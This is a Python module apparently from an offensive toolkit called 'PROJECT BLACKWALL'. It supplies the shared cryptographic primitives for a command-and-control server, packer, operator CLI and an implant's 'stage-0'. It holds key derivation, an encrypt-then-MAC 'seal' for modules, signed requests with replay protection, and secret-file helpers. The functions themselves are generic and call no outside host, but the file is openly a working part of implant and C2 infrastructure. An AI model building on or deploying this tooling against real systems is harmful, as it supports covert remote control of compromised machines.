#!/usr/bin/env python3
"""PROJECT BLACKWALL // shared C2 primitives (stdlib only).

Used by the server, packer and operator CLI.  The implant keeps its own
compact copy of the same primitives so that stage-0 stays a single file.
"""

import base64
import hashlib
import hmac
import json
import os
import secrets
import tempfile
import threading
import time

MAGIC = b"BWM1"
PROTO = "1"
SALT = b"blackwall-c2-v1"
SKEW = 300


def b64e(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.b64encode(data).decode("ascii")


def b64d(text):
    return base64.b64decode(text.encode("ascii") if isinstance(text, str) else text)


def hkdf(ikm, info=b"", length=32, salt=SALT):
    """HKDF-SHA256 (extract + expand).  Stdlib only."""
    if isinstance(ikm, str):
        ikm = ikm.encode()
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    okm = b""
    block = b""
    counter = 1
    while len(okm) < length:
        block = hmac.new(prk, block + info + bytes([counter]), hashlib.sha256).digest()
        okm += block
        counter += 1
    return okm[:length]


def _keystream(key, nonce, size):
    out = bytearray()
    counter = 0
    while len(out) < size:
        out += hmac.new(key, nonce + counter.to_bytes(4, "big"), hashlib.sha256).digest()
        counter += 1
    return bytes(out[:size])


def _xor(data, stream):
    return bytes(a ^ b for a, b in zip(data, stream))


def _keys(secret, purpose):
    if isinstance(secret, str):
        secret = secret.encode()
    root = hkdf(secret, info=b"bw-" + purpose)
    return hkdf(root, info=b"enc"), hkdf(root, info=b"mac")


def seal(secret, plaintext, purpose=b"module"):
    """Encrypt-then-MAC using HMAC-SHA256 as a PRF stream.

    Format: MAGIC(4) | nonce(16) | tag(32) | ciphertext.
    This is not AES-GCM, but it is authenticated, randomised and built only
    from the Python standard library, which matters on a stripped hill box.
    """
    enc_key, mac_key = _keys(secret, purpose)
    nonce = secrets.token_bytes(16)
    cipher = _xor(plaintext, _keystream(enc_key, nonce, len(plaintext)))
    tag = hmac.new(mac_key, MAGIC + nonce + cipher, hashlib.sha256).digest()
    return MAGIC + nonce + tag + cipher


def unseal(secret, blob, purpose=b"module"):
    if not blob or not blob.startswith(MAGIC) or len(blob) < 52:
        raise ValueError("bad seal header")
    enc_key, mac_key = _keys(secret, purpose)
    nonce = blob[4:20]
    tag = blob[20:52]
    cipher = blob[52:]
    expected = hmac.new(mac_key, MAGIC + nonce + cipher, hashlib.sha256).digest()
    if not hmac.compare_digest(tag, expected):
        raise ValueError("bad seal tag")
    return _xor(cipher, _keystream(enc_key, nonce, len(cipher)))


def sign(secret, method, path, ts, nonce, body=b""):
    if isinstance(secret, str):
        secret = secret.encode()
    if isinstance(body, str):
        body = body.encode()
    msg = b"\n".join(
        (
            method.upper().encode(),
            path.encode(),
            str(ts).encode(),
            nonce.encode(),
            hashlib.sha256(body).hexdigest().encode(),
        )
    )
    return hmac.new(secret, msg, hashlib.sha256).hexdigest()


def verify(secret, method, path, ts, nonce, sig, body=b"", skew=SKEW):
    try:
        parsed = int(ts)
    except (TypeError, ValueError):
        return False, "bad timestamp"
    if abs(time.time() - parsed) > skew:
        return False, "clock skew"
    expected = sign(secret, method, path, ts, nonce, body)
    if not hmac.compare_digest(expected, sig or ""):
        return False, "bad signature"
    return True, "ok"


def fingerprint_pem(pem):
    """SHA256 fingerprint of a PEM certificate, uppercase hex, no colons."""
    from ssl import PEM_cert_to_DER_cert

    der = PEM_cert_to_DER_cert(pem)
    return hashlib.sha256(der).hexdigest().upper()


def fingerprint_file(path):
    with open(path, "r", encoding="ascii") as fh:
        return fingerprint_pem(fh.read())


def read_json(path, default=None):
    try:
        with open(path, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except (OSError, ValueError):
        return default


def write_json(path, obj, mode=0o600):
    parent = os.path.dirname(os.path.abspath(path))
    if parent:
        os.makedirs(parent, exist_ok=True)
    fd, tmp = tempfile.mkstemp(prefix=".bw", dir=parent)
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            json.dump(obj, fh, indent=2, sort_keys=True)
            fh.write("\n")
        os.chmod(tmp, mode)
        os.replace(tmp, path)
    finally:
        try:
            os.unlink(tmp)
        except OSError:
            pass


def read_secret_file(path):
    obj = read_json(path, {})
    return obj


def safe_name(name, default="module"):
    keep = []
    for ch in str(name or ""):
        if ch.isalnum() or ch in "._-":
            keep.append(ch)
    out = "".join(keep).strip(".-")
    return out or default


class NonceCache:
    """Replay protection: a nonce may be used only once inside the window."""

    def __init__(self, ttl=SKEW * 2):
        self.ttl = ttl
        self._seen = {}
        self._lock = threading.Lock()

    def check(self, nonce):
        now = time.time()
        with self._lock:
            if len(self._seen) > 4096:
                self._seen = {k: v for k, v in self._seen.items() if v > now}
            if nonce in self._seen and self._seen[nonce] > now:
                return False
            self._seen[nonce] = now + self.ttl
            return True


def redact(text, limit=160):
    text = str(text)
    return text if len(text) <= limit else text[:limit] + "..."
